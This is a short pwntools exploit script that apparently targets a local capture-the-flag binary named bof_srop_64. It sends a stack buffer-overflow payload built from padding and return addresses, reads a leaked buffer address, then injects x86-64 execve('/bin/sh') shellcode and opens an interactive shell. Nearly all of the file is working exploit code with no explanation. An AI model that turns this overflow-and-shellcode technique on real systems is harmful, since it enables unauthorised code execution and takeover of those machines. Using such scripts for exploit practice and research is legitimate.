from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/bof_srop_64")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q\x11@\x00\x00\x00\x00\x00\x80I@\x00\x00\x00\x00\x00p\x10@\x00\x00\x00\x00\x00\x80I@\x00\x00\x00\x00\x00\n'
p.send(payload)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffeff00\n')
payload = b""
payload += b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
payload += b"\n"
p.send(payload)
p.interactive()
